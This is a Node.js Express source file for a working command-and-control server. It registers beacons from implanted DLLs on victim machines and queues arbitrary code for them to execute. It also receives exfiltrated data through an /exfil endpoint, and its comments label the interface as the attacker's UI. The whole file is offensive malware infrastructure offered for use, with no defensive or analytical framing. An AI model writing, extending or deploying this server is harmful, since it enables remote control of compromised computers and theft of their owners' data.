const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const bodyParser = require('body-parser');
const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public')); // serve your HTML/JS from ./public

// In-memory storage (use Redis in real deployment)
const endpoints = new Map(); // id → { id, hostname, lastSeen, tasks: [] }
let nextId = 1;

// === 1. DLL BEACON ENDPOINT ===
app.post('/beacon', (req, res) => {
  const { hostname, arch, pid, os } = req.body;
  const id = `ep_${nextId++}`;

  endpoints.set(id, {
    id,
    hostname: hostname || 'unknown',
    arch: arch || 'x64',
    pid: pid || 0,
    os: os || 'windows',
    lastSeen: Date.now(),
    tasks: [] // queue of { taskId, code }
  });

  console.log(`[+] New endpoint: ${id} (${hostname})`);
  io.emit('new_endpoint', { id, hostname, arch, os }); // notify attacker UI

  res.json({ id, pollUrl: `/tasks?id=${id}` });
});

// === 2. DLL TASK POLLING ===
app.get('/tasks', (req, res) => {
  const id = req.query.id;
  const ep = endpoints.get(id);

  if (!ep) {
    return res.status(404).json({ error: 'Endpoint not found' });
  }

  ep.lastSeen = Date.now();

  if (ep.tasks.length > 0) {
    const task = ep.tasks.shift(); // FIFO
    console.log(`[→] Sending task ${task.taskId} to ${id}`);
    res.json({ taskId: task.taskId, code: task.code });
  } else {
    res.json({ idle: true });
  }
});

// === 3. ATTACKER SENDS TASK (e.g., from Python script or UI) ===
app.post('/send_task', (req, res) => {
  const { endpointId, code } = req.body;
  const ep = endpoints.get(endpointId);

  if (!ep) {
    return res.status(404).json({ error: 'Endpoint not found' });
  }

  const taskId = `task_${Date.now()}`;
  ep.tasks.push({ taskId, code });

  console.log(`[←] Queued task for ${endpointId}`);
  io.emit('task_queued', { endpointId, taskId }); // optional: notify UI

  res.json({ status: 'queued', taskId });
});

// === 4. DLL SENDS EXFIL DATA (optional) ===
app.post('/exfil', (req, res) => {
  const { endpointId, data, dataType } = req.body;
  console.log(`[!] EXFIL from ${endpointId}:`, dataType);
  // In real use: log to DB, alert, etc.
  io.emit('exfil_received', { endpointId, dataType, data });
  res.json({ status: 'received' });
});

// === 5. SERVE YOUR C2 PAGE (attacker UI) ===
// Put your working_c2_browser_pixel.html in ./public/index.html
// It will auto-connect via Socket.IO

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`C2 server running on http://localhost:${PORT}`);
});
